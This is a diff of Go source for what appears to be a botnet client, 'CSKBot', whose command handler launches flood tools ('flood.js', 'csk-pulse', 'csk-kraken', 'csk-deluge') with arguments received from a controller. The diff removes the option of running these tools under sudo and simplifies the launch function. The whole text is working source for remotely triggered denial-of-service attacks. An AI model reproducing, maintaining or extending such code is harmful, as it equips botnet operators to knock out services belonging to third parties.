@@ -118,7 +118,6 @@ func (bot *CSKBot) executeCommand(command string) {
 	args := parts[1:]
 
 	var scriptToRun string
-	var useSudo bool
 	var isExecutable bool
 
 	switch method {
@@ -126,15 +125,12 @@ func (bot *CSKBot) executeCommand(command string) {
 		scriptToRun = "flood.js"
 	case "csk-pulse":
 		scriptToRun = "./csk-pulse"
-		useSudo = true
 		isExecutable = true
 	case "csk-kraken":
 		scriptToRun = "./csk-kraken"
-		useSudo = true
 		isExecutable = true
 	case "csk-deluge":
 		scriptToRun = "./lid2hz"
-		useSudo = true
 		isExecutable = true
 	default:
 		log.Println("Unknown method:", method)
@@ -147,7 +143,7 @@ func (bot *CSKBot) executeCommand(command string) {
 	}
 
 	log.Printf("Executing: %s with args: %v\n", method, args)
-	bot.runScript(scriptToRun, args, useSudo, isExecutable)
+	bot.runScript(scriptToRun, args, isExecutable)
 }
 
 func (bot *CSKBot) handleStopCommand(command string) {
@@ -178,20 +174,16 @@ func (bot *CSKBot) stopAllProcesses() {
 	}
 }
 
-func (bot *CSKBot) runScript(scriptToRun string, args []string, useSudo bool, isExecutable bool) {
+func (bot *CSKBot) runScript(scriptToRun string, args []string, isExecutable bool) {
 	var cmd *exec.Cmd
 
-	if useSudo && isExecutable {
-		cmdArgs := append([]string{scriptToRun}, args...)
-		cmd = exec.Command("sudo", cmdArgs...)
-	} else if isExecutable {
+	if isExecutable {
 		cmd = exec.Command(scriptToRun, args...)
 	} else {
 		cmdArgs := append([]string{scriptToRun}, args...)
 		cmd = exec.Command("node", cmdArgs...)
 	}
 
-	// Không cần SysProcAttr, process vẫn chạy được
 	cmd.Stdout = nil
 	cmd.Stderr = nil
 	cmd.Stdin = nil
